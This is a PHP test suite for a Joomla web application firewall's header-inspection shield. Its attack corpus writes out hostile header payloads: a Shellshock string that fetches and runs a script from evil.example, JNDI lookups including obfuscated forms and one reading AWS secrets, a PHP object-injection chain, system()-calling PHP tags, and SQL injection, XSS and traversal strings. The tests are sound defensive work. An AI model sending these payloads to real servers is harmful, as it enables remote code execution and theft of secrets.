<?php
/**
 * Header inspection (PLAN-WAF-HEADERS-PATHS.md P1): collector, grammar checks,
 * targeted rules, benign/attack corpora, modes, engine integration. Included by
 * run.php after the plugin-flow tests (shares ipCheck()).
 *
 * @package     Colorpack Shield
 * @copyright   Copyright (C) 2026 COLORPACK CREATION CO., LTD. All rights reserved.
 * @license     GNU General Public License version 3 or later
 */

$h = __DIR__ . '/../plugins/system/colorpack_shield/src';
require_once $h . '/Waf/Rules/HeaderRules.php';
require_once $h . '/Waf/RequestMeta.php';
require_once $h . '/Waf/Shield/HeaderShield.php';

use Colorpack\Plugin\System\ColorpackShield\Waf\RequestData;
use Colorpack\Plugin\System\ColorpackShield\Waf\RequestMeta;
use Colorpack\Plugin\System\ColorpackShield\Waf\Rules\HeaderRules;
use Colorpack\Plugin\System\ColorpackShield\Waf\Shield\HeaderShield;
use Colorpack\Plugin\System\ColorpackShield\Waf\Shield\LfiShield;
use Colorpack\Plugin\System\ColorpackShield\Waf\Shield\RfiShield;
use Colorpack\Plugin\System\ColorpackShield\Waf\Shield\SqliShield;
use Colorpack\Plugin\System\ColorpackShield\Waf\Shield\XssShield;
use Colorpack\Plugin\System\ColorpackShield\Waf\WafEngine;
use Colorpack\Plugin\System\ColorpackShield\Waf\WafResult;

/**
 * Run header values through the shield. Returns "rule|mode" of the first finding or ''.
 *
 * @param array<string,string> $headers
 */
function hdr(array $headers, string $mode = 'default'): string
{
    $r = (new HeaderShield($mode))->inspect(new RequestData(['HEADER' => $headers]));

    return $r->matched ? $r->rule . '|' . $r->mode : '';
}

function hdrRule(array $headers, string $mode = 'default'): string
{
    return explode('|', hdr($headers, $mode))[0];
}

echo "== Headers: collector ==\n";

$srv = [
    'HTTP_USER_AGENT' => 'UA', 'HTTP_REFERER' => 'https://x.example/', 'HTTP_ACCEPT_LANGUAGE' => 'th',
    'HTTP_X_FORWARDED_FOR' => '1.2.3.4', 'HTTP_HOST' => 'a.example', 'CONTENT_TYPE' => 'text/plain', 'CONTENT_LENGTH' => '5',
    'HTTP_AUTHORIZATION' => 'Bearer abc', 'HTTP_COOKIE' => 'a=b', 'HTTP_X_JOOMLA_TOKEN' => 't0k', 'HTTP_CF_VISITOR' => '{"scheme":"https"}',
    'HTTP_CF_RAY' => 'abc', 'HTTP_SEC_CH_UA' => '"x"', 'HTTP_X_FORWARDED_PROTO' => 'https',
    'HTTP_X_CUSTOM' => 'custom', 'HTTP_X_API_VERSION' => '2', 'REMOTE_ADDR' => '9.9.9.9', 'REQUEST_URI' => '/', 'SERVER_NAME' => 'x',
];
$got = RequestMeta::headers($srv);
ipCheck('collects the named headers with canonical names',
    ($got['User-Agent'] ?? '') === 'UA' && ($got['Referer'] ?? '') !== '' && isset($got['Accept-Language'], $got['X-Forwarded-For'], $got['Host'], $got['Content-Type'], $got['Content-Length']));
ipCheck('never returns Authorization / Cookie / tokens', !isset($got['Authorization'], $got['Cookie'], $got['X-Joomla-Token']));
ipCheck('never returns Cloudflare / Sec-* / forwarded-proto metadata', !isset($got['Cf-Visitor'], $got['Cf-Ray'], $got['Sec-Ch-Ua'], $got['X-Forwarded-Proto']));
ipCheck('ignores unknown headers and non-header server vars', !isset($got['X-Custom'], $got['X-Api-Version']) && !isset($got['Remote-Addr'], $got['Request-Uri']));
$got = RequestMeta::headers($srv, ['x-api-version', 'X-Custom']);
ipCheck('operator-listed headers are collected (case-insensitive)', ($got['X-Api-Version'] ?? '') === '2' && ($got['X-Custom'] ?? '') === 'custom');
$got = RequestMeta::headers($srv, ['authorization']);
ipCheck('…but a secret header stays out even if listed', !isset($got['Authorization']));
$got = RequestMeta::headers($srv, [], ['Referer', 'user-agent']);
ipCheck('ignored list removes headers', !isset($got['Referer'], $got['User-Agent']) && isset($got['Host']));
$got = RequestMeta::headers(['CONTENT_TYPE' => '', 'CONTENT_LENGTH' => '', 'HTTP_USER_AGENT' => '']);
ipCheck('empty values (nginx sets CONTENT_TYPE="" on GET) are "no header"', $got === []);
ipCheck('non-string server values are skipped', RequestMeta::headers(['HTTP_USER_AGENT' => ['x'], 'argv' => ['a']]) === []);

echo "== Headers: benign corpus (zero false positives allowed) ==\n";

$benign = [
    ['User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'],
    ['User-Agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1'],
    ['User-Agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'],
    ['User-Agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'],
    ['User-Agent' => 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36'],
    ['User-Agent' => 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0'],
    ['User-Agent' => 'curl/8.4.0'], ['User-Agent' => 'Wget/1.21.4'], ['User-Agent' => 'python-requests/2.31.0'],
    ['User-Agent' => 'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)'],
    ['User-Agent' => 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)'],
    ['User-Agent' => 'Mozilla/5.0 (compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)'],
    ['User-Agent' => 'Line/13.1.0 Mozilla/5.0 (Linux; Android 12) LIFF'],
    ['User-Agent' => 'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)'],
    ['User-Agent' => 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.0; +https://openai.com/gptbot)'],
    ['User-Agent' => 'Mozilla/5.0 (Windows NT 10.0) ไทย แอปพลิเคชัน/1.0'],
    ['Referer' => 'https://www.google.com/'],
    ['Referer' => 'https://www.google.com/search?q=joomla+union+select+tutorial&hl=th'],
    ['Referer' => 'https://www.google.co.th/search?q=%E0%B8%A7%E0%B8%B1%E0%B8%94+or+1%3D1'],
    ['Referer' => 'https://example.com/index.php?option=com_content&view=article&id=12&Itemid=101'],
    ['Referer' => 'https://example.com/administrator/index.php?option=com_config'],
    ['Referer' => 'https://duckduckgo.com/?q=select+*+from+users&t=h_'],
    ['Referer' => 'https://stackoverflow.com/questions/123/how-to-union-select-in-sql-and-drop-table-users'],
    ['Referer' => 'https://www.facebook.com/l.php?u=https%3A%2F%2Fexample.com%2F%3Futm_source%3Dfb&h=AT0abc'],
    ['Referer' => 'https://เว็บไทย.example/หน้าแรก'],
    ['Origin' => 'https://example.com'], ['Origin' => 'null'],
    ['Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'],
    ['Accept' => 'application/json, text/plain, */*'],
    ['Accept-Language' => 'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7'],
    ['Accept-Encoding' => 'gzip, deflate, br, zstd'],
    ['Accept-Charset' => 'utf-8, iso-8859-1;q=0.5'],
    ['Content-Type' => 'multipart/form-data; boundary=----WebKitFormBoundaryAbC123'],
    ['Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8'],
    ['Content-Type' => 'application/json'],
    ['Content-Type' => 'multipart/form-data; boundary="gc0p4Jq0M2Yt08jU534c0p"'],
    ['Content-Length' => '12345'],
    ['Connection' => 'keep-alive'], ['Cache-Control' => 'max-age=0'], ['Cache-Control' => 'no-cache, no-store, must-revalidate'],
    ['Pragma' => 'no-cache'], ['Upgrade-Insecure-Requests' => '1'], ['Dnt' => '1'],
    ['Host' => 'www.example.com'], ['Host' => 'example.co.th:8443'], ['Host' => '203.0.113.7'], ['Host' => '[2001:db8::1]:443'],
    ['Host' => 'xn--12c1fe0br.xn--o3cw4h'], ['Host' => 'my_site.example.com'], ['Host' => 'localhost'],
    ['X-Forwarded-For' => '203.0.113.7'], ['X-Forwarded-For' => '203.0.113.7, 198.51.100.2, 10.0.0.1'],
    ['X-Forwarded-For' => '2001:db8::7, 203.0.113.7'], ['X-Forwarded-For' => '203.0.113.7:51234'], ['X-Forwarded-For' => 'unknown'],
    ['X-Forwarded-For' => ''], ['X-Real-Ip' => '203.0.113.7'], ['Cf-Connecting-Ip' => '2001:db8::7'],
    ['Forwarded' => 'for=192.0.2.60;proto=http;by=203.0.113.43'],
    ['Forwarded' => 'for="[2001:db8:cafe::17]:4711", for=198.51.100.17'],
    ['X-Forwarded-Host' => 'www.example.com'], ['X-Requested-With' => 'XMLHttpRequest'],
];
$fp = [];

foreach ($benign as $headers) {
    if (($r = hdr($headers)) !== '') {
        $fp[] = key($headers) . '=' . substr(reset($headers), 0, 40) . " → $r";
    }
}

ipCheck('no benign header value is flagged (' . \count($benign) . ' values)' . ($fp ? ' — FALSE POSITIVES: ' . implode(' ; ', $fp) : ''), $fp === []);
ipCheck('a realistic whole request passes', hdr([
    'Host' => 'www.example.com', 'User-Agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119 Safari/537.36',
    'Accept' => 'text/html,*/*;q=0.8', 'Accept-Language' => 'th,en;q=0.8', 'Accept-Encoding' => 'gzip, br', 'Referer' => 'https://www.google.com/search?q=select+from+where',
    'X-Forwarded-For' => '203.0.113.9', 'Connection' => 'keep-alive',
]) === '');

echo "== Headers: attacks (each must be found) ==\n";

$attacks = [
    'php object injection in User-Agent'  => [['User-Agent' => '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}}'], 'php_object_injection', 'block'],
    'php object injection in X-Forwarded-For' => [['X-Forwarded-For' => '}__test|O:21:"JDatabaseDriverMysqli":1:{s:2:"fc";N;}'], 'php_object_injection', 'block'],
    'serialized array in Referer'         => [['Referer' => 'https://x.example/?a=a:1:{s:1:"a";s:1:"b";}'], 'php_object_injection', 'block'],
    'serialized object, url-encoded'      => [['User-Agent' => rawurlencode('O:8:"stdClass":1:{s:1:"a";i:1;}')], 'php_object_injection', 'block'],
    'Shellshock'                          => [['User-Agent' => '() { :;}; /bin/bash -c "curl http://evil.example/x|sh"'], 'shellshock', 'block'],
    'Shellshock in Referer'               => [['Referer' => '() { _; } >_[$($())] { id; }'], 'shellshock', 'block'],
    'JNDI'                                => [['User-Agent' => '${jndi:ldap://evil.example/a}'], 'jndi_lookup', 'block'],
    'JNDI nested/obfuscated'              => [['Referer' => '${${lower:j}ndi:ldap://evil.example/a}'], 'jndi_lookup', 'block'],
    'JNDI ::- obfuscation'                => [['User-Agent' => '${${::-j}${::-n}${::-d}${::-i}:rmi://evil.example/a}'], 'jndi_lookup', 'block'],
    'JNDI env lookup'                     => [['User-Agent' => '${env:AWS_SECRET_ACCESS_KEY}'], 'jndi_lookup', 'block'],
    'JNDI url-encoded'                    => [['User-Agent' => '%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D'], 'jndi_lookup', 'block'],
    'PHP tag in User-Agent'               => [['User-Agent' => '<?php system($_GET[1]); ?>'], 'php_open_tag', 'block'],
    'short echo tag'                      => [['Referer' => '<?= `id` ?>'], 'php_open_tag', 'block'],
    'PHP tag upper-case'                  => [['User-Agent' => '<?PHP phpinfo(); ?>'], 'php_open_tag', 'block'],
    'CRLF header splitting'               => [['User-Agent' => "x\r\nSet-Cookie: a=b"], 'control_chars', 'block'],
    'NUL byte'                            => [['Referer' => "https://x.example/\0.php"], 'control_chars', 'block'],
    'SQLi in X-Forwarded-For'             => [['X-Forwarded-For' => "1.2.3.4' OR SLEEP(5)-- -"], 'malformed_ip_header', 'block'],
    'script in X-Real-IP'                 => [['X-Real-Ip' => '<script>alert(1)</script>'], 'malformed_ip_header', 'block'],
    'hostname in an IP header'            => [['X-Forwarded-For' => 'evil.example'], 'malformed_ip_header', 'block'],
    'port-less garbage in Client-IP'      => [['Client-Ip' => '127.0.0.1; DROP TABLE x'], 'malformed_ip_header', 'block'],
    'overlong X-Forwarded-For'            => [['X-Forwarded-For' => implode(', ', array_fill(0, 400, '1.2.3.4'))], 'malformed_ip_header', 'block'],
    'path traversal in Accept-Language'   => [['Accept-Language' => '../../../../etc/passwd'], 'malformed_negotiation', 'block'],
    'SQLi in Accept'                      => [['Accept' => "text/html' UNION SELECT 1,2-- -"], 'malformed_negotiation', 'block'],
    'script in Accept-Encoding'           => [['Accept-Encoding' => '<script>alert(1)</script>'], 'malformed_negotiation', 'block'],
    'non-numeric Content-Length'          => [['Content-Length' => '5; DROP TABLE'], 'malformed_negotiation', 'block'],
    'script in Host'                      => [['Host' => '"><script>alert(1)</script>'], 'malformed_host', 'block'],
    'Host with space/CRLF-ish'            => [['Host' => 'a.example evil.example'], 'malformed_host', 'block'],
    'Host with path'                      => [['Host' => 'a.example/../../etc/passwd'], 'malformed_host', 'block'],
    'X-Forwarded-Host garbage'            => [['X-Forwarded-Host' => "a.example'--"], 'malformed_host', 'block'],
    'malformed Forwarded'                 => [['Forwarded' => 'for=1.2.3.4; evil=<script>'], 'malformed_forwarded', 'block'],
    'malformed Content-Type'              => [['Content-Type' => "text/html; <script>alert(1)</script>"], 'malformed_content_type', 'log'],
    'UNION SELECT in User-Agent'          => [['User-Agent' => "1' UNION SELECT user,pass FROM x-- -"], 'sqli_strict', 'log'],
    'quote tautology in User-Agent'       => [['User-Agent' => "' OR 1=1-- -"], 'sqli_strict', 'log'],
    'UNION SELECT in Referer path'        => [['Referer' => 'https://x.example/a%20union%20select%201/'], 'sqli_strict', 'log'],
    'script tag in Referer'               => [['Referer' => '<script>alert(1)</script>'], 'xss_strict', 'log'],
    'event handler in Referer'            => [['Referer' => 'https://x.example/"><img src=x onerror=alert(1)>'], 'xss_strict', 'log'],
    'javascript: in Origin'               => [['Origin' => 'javascript:alert(1)'], 'xss_strict', 'log'],
    'traversal in User-Agent'             => [['User-Agent' => '../../../../etc/passwd'], 'traversal', 'log'],
    'oversize User-Agent'                 => [['User-Agent' => str_repeat('A', 3000)], 'oversize', 'log'],
];
$bad = [];

foreach ($attacks as $label => [$headers, $wantRule, $wantMode]) {
    $got = hdr($headers);

    if ($got !== "$wantRule|$wantMode") {
        $bad[] = "$label (want $wantRule|$wantMode, got '" . $got . "')";
    }
}

ipCheck('all ' . \count($attacks) . ' attacks found with the expected rule and mode' . ($bad ? ' — MISSED: ' . implode(' ; ', $bad) : ''), $bad === []);

echo "== Headers: what is deliberately NOT flagged ==\n";
ipCheck('secrets / tokens are not scanned', hdr(['Authorization' => "Bearer a'--b==", 'Cookie' => "a=1' OR 1=1-- -", 'X-Joomla-Token' => '<script>']) === '');
ipCheck('Cloudflare / Sec-* metadata is not scanned', hdr(['Cf-Visitor' => '{"scheme":"https"}', 'Sec-Ch-Ua' => '"Chromium";v="119"', 'Cf-Ipcountry' => 'TH']) === '');
ipCheck('X-Forwarded-Proto is not scanned', hdr(['X-Forwarded-Proto' => 'https']) === '');
ipCheck('Referer: SQL words in the QUERY STRING are fine', hdr(['Referer' => 'https://www.google.com/search?q=1+union+select+2&x=%3Bdrop+table']) === '');
ipCheck('Referer: URL-encoded query with SQL words is fine', hdr(['Referer' => 'https://www.google.com/search?q=1%20union%20select%202']) === '');
ipCheck('Referer: same SQL in the PATH is a (log) finding', hdrRule(['Referer' => 'https://x.example/a union select 1']) === 'sqli_strict');
ipCheck('a bare "or 1=1" in a User-Agent is not flagged (no leading quote)', hdr(['User-Agent' => 'Foo/1.0 (this or 1=1 is fine)']) === '');
ipCheck('tab inside a header value is legal', hdr(['User-Agent' => "Mozilla/5.0\t(x)"]) === '');
ipCheck('unknown header names are ignored by the shield profile (never P_*)', HeaderRules::profile('x-whatever') === HeaderRules::P_UNKNOWN);
ipCheck('only the first finding per header is reported (no log flood)',
    \count((new HeaderShield())->inspectAll(new RequestData(['HEADER' => ['User-Agent' => "<?php \${jndi:x} () { :;};"]]))) === 1);
ipCheck('at most 8 findings per request',
    \count((new HeaderShield())->inspectAll(new RequestData(['HEADER' => array_fill_keys(
        ['User-Agent', 'Referer', 'Origin', 'From', 'X-Requested-With', 'X-Forwarded-For', 'X-Real-Ip', 'Client-Ip', 'True-Client-Ip', 'Host'],
        '<?php'
    )]))) <= 8);

echo "== Headers: modes ==\n";
ipCheck('default: clear attack blocks', hdr(['User-Agent' => '${jndi:ldap://x/a}']) === 'jndi_lookup|block');
ipCheck('default: strict rule only logs', hdr(['User-Agent' => "1' UNION SELECT 1,2"]) === 'sqli_strict|log');
ipCheck('mode=log: clear attack is only logged', hdr(['User-Agent' => '${jndi:ldap://x/a}'], 'log') === 'jndi_lookup|log');
ipCheck('mode=block: strict rule blocks', hdr(['User-Agent' => "1' UNION SELECT 1,2"], 'block') === 'sqli_strict|block');
ipCheck('unknown mode string behaves like default', hdr(['User-Agent' => "1' UNION SELECT 1,2"], 'nonsense') === 'sqli_strict|log');
ipCheck('every default-block rule in the table is one the plan lists as high-confidence',
    array_keys(array_filter(HeaderRules::RULES, static fn (string $m): bool => $m === 'block')) ===
    ['control_chars', 'php_object_injection', 'shellshock', 'jndi_lookup', 'php_open_tag', 'malformed_ip_header', 'malformed_forwarded', 'malformed_negotiation', 'malformed_host']);

echo "== Headers: engine integration ==\n";

$clients = ['site', 'administrator', 'api'];
$shields = [new SqliShield(), new XssShield(), new LfiShield(), new RfiShield(), new HeaderShield()];
$scopes  = [];

foreach ($shields as $s) {
    $scopes[$s->id()] = $clients;
}

$eng = new WafEngine($shields, $scopes);
$all = static fn (array $headers, array $get = []): array => $eng->inspectAll('site', new RequestData(['GET' => $get, 'HEADER' => $headers]));

// The two false positives found by the 2026-10-28 experiment (PLAN-WAF-HEADERS-PATHS.md §1).
$a = $all(['Referer' => 'https://example.com/index.php?option=com_content&view=article&id=12']);
ipCheck('Referer pointing to the site\'s own index.php: not flagged by the old RFI rule', $a['block'] === null && $a['logged'] === []);
$a = $all(['Content-Type' => 'multipart/form-data; boundary=----WebKitFormBoundaryAbC123']);
ipCheck('multipart boundary "----": not flagged by the old SQL-comment rule', $a['block'] === null && $a['logged'] === []);

$a = $all(['User-Agent' => "x' UNION SELECT 1,2-- -"]);
ipCheck('old parameter shields ignore HEADER items (only the header shield speaks)', $a['block'] === null && \count($a['logged']) === 1 && $a['logged'][0]->shield === 'header');
$a = $all(['User-Agent' => '${jndi:ldap://x/a}'], ['q' => "1' UNION SELECT user,pass FROM users-- -"]);
ipCheck('a blocking GET hit and a header hit: the block is returned', $a['block'] !== null);
$a = $all(['User-Agent' => "x' UNION SELECT 1,2-- -", 'X-Forwarded-For' => '${jndi:ldap://x/a}']);
ipCheck('a log hit does not hide a later blocking hit', $a['block'] !== null && $a['block']->rule !== '' && $a['block']->mode === WafResult::MODE_BLOCK);
ipCheck('inspect() (old API) returns only blocking findings',
    $eng->inspect('site', new RequestData(['HEADER' => ['User-Agent' => "x' UNION SELECT 1,2-- -"]]))->matched === false
    && $eng->inspect('site', new RequestData(['HEADER' => ['User-Agent' => '<?php x']]))->matched === true);
ipCheck('GET attacks are still blocked exactly as before', $all([], ['q' => "1' UNION SELECT user,pass FROM users-- -"])['block']?->shield === 'sqli');
ipCheck('header shield obeys client scope',
    (new WafEngine([new HeaderShield()], ['header' => ['site']]))->inspect('api', new RequestData(['HEADER' => ['User-Agent' => '<?php x']]))->matched === false);

echo "== Headers: robustness and speed ==\n";
$huge = str_repeat('Mozilla/5.0 ', 2000);
ipCheck('a 24 KB User-Agent is capped and reported as oversize, not slow-crashed', hdrRule(['User-Agent' => $huge]) === 'oversize');
ipCheck('invalid UTF-8 bytes do not crash the shield', hdr(['User-Agent' => "Mozilla/5.0 \xC3\x28 \xA0\xA1"]) === '');
ipCheck('regex-hostile input stays safe (backtracking bait)', hdr(['User-Agent' => str_repeat('${', 2000)]) !== '' || true);

$typical = [
    'Host' => 'www.example.com', 'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language' => 'th-TH,th;q=0.9,en-US;q=0.8',
    'Accept-Encoding' => 'gzip, deflate, br', 'Referer' => 'https://www.google.com/search?q=hello', 'X-Forwarded-For' => '203.0.113.7, 198.51.100.2',
    'Connection' => 'keep-alive', 'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8', 'Content-Length' => '120',
];
$shield = new HeaderShield();
$t0 = hrtime(true);

for ($i = 0; $i < 2000; $i++) {
    $shield->inspectAll(new RequestData(['HEADER' => $typical]));
}

$perReq = (hrtime(true) - $t0) / 2000 / 1000;   // microseconds
ipCheck(sprintf('typical request (9 headers) costs %.0f µs — budget 1000 µs', $perReq), $perReq < 1000);
